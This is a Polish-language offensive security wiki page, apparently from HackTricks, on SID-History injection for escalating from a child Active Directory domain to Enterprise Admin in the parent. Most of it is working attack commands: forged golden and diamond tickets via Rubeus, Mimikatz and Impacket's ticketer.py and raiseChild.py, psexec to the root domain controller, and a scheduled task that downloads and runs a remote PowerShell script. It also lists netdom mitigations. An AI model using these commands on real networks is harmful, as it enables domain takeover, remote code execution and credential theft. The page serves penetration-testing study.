# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## Atak wstrzykiwania historii SID

Celem **ataku wstrzykiwania historii SID** jest wspieranie **migracji użytkowników między domenami** przy jednoczesnym zapewnieniu dostępu do zasobów z poprzedniej domeny. Osiąga się to poprzez **włączenie poprzedniego identyfikatora zabezpieczeń (SID) użytkownika do historii SID** jego nowe konto. Co ważne, proces ten można zmanipulować, aby przyznać nieautoryzowany dostęp, dodając SID grupy o wysokich uprawnieniach (takiej jak Enterprise Admins lub Domain Admins) z domeny macierzystej do historii SID. To wykorzystanie przyznaje dostęp do wszystkich zasobów w domenie macierzystej.

Istnieją dwie metody wykonania tego ataku: poprzez stworzenie **Złotego Biletu** lub **Diamentowego Biletu**.

Aby zidentyfikować SID dla grupy **"Enterprise Admins"**, należy najpierw zlokalizować SID domeny głównej. Po identyfikacji, SID grupy Enterprise Admins można skonstruować, dodając `-519` do SID domeny głównej. Na przykład, jeśli SID domeny głównej to `S-1-5-21-280534878-1496970234-700767426`, to wynikowy SID dla grupy "Enterprise Admins" będzie `S-1-5-21-280534878-1496970234-700767426-519`.

Można również użyć grupy **Domain Admins**, której SID kończy się na **512**.

Innym sposobem na znalezienie SID grupy z innej domeny (na przykład "Domain Admins") jest:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Zauważ, że możliwe jest wyłączenie historii SID w relacji zaufania, co spowoduje niepowodzenie tego ataku.

Zgodnie z [**dokumentacją**](https://technet.microsoft.com/library/cc835085.aspx):
- **Wyłączenie SIDHistory w zaufaniach lasów** za pomocą narzędzia netdom (`netdom trust /domain: /EnableSIDHistory:no na kontrolerze domeny`)
- **Zastosowanie kwarantanny filtrów SID do zaufania zewnętrznych** za pomocą narzędzia netdom (`netdom trust /domain: /quarantine:yes na kontrolerze domeny`)
- **Zastosowanie filtrowania SID do zaufania domen w obrębie jednego lasu** nie jest zalecane, ponieważ jest to nieobsługiwana konfiguracja i może powodować zmiany łamiące. Jeśli domena w lesie jest niegodna zaufania, nie powinna być członkiem lasu. W tej sytuacji konieczne jest najpierw podzielenie zaufanych i niegodnych zaufania domen na oddzielne lasy, gdzie można zastosować filtrowanie SID do zaufania między lasami.

Sprawdź ten post, aby uzyskać więcej informacji na temat obejścia tego: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Ostatnim razem, gdy to próbowałem, musiałem dodać argument **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Złoty Bilet (Mimikatz) z KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Aby uzyskać więcej informacji na temat złotych biletów, sprawdź:

{{#ref}}
golden-ticket.md
{{#endref}}


Aby uzyskać więcej informacji na temat diamentowych biletów, sprawdź:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Zwiększ uprawnienia do DA roota lub administratora Enterprise, używając hasha KRBTGT skompromitowanej domeny:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Z uzyskanymi uprawnieniami z ataku możesz na przykład przeprowadzić atak DCSync w nowej domenie:

{{#ref}}
dcsync.md
{{#endref}}

### Z linuxa

#### Ręcznie z [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatycznie przy użyciu [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

To jest skrypt Impacket, który **automatyzuje eskalację z domeny podrzędnej do nadrzędnej**. Skrypt wymaga:

- Docelowego kontrolera domeny
- Poświadczeń dla użytkownika administratora w domenie podrzędnej

Przebieg jest następujący:

- Uzyskuje SID grupy Enterprise Admins w domenie nadrzędnej
- Pobiera hash konta KRBTGT w domenie podrzędnej
- Tworzy Złoty Bilet
- Loguje się do domeny nadrzędnej
- Pobiera poświadczenia dla konta Administrator w domenie nadrzędnej
- Jeśli przełącznik `target-exec` jest określony, uwierzytelnia się do kontrolera domeny domeny nadrzędnej za pomocą Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Odniesienia

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
